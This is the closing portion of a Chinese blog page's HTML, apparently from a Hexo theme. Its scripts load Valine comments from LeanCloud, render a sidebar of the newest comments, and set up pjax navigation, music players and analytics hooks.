      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>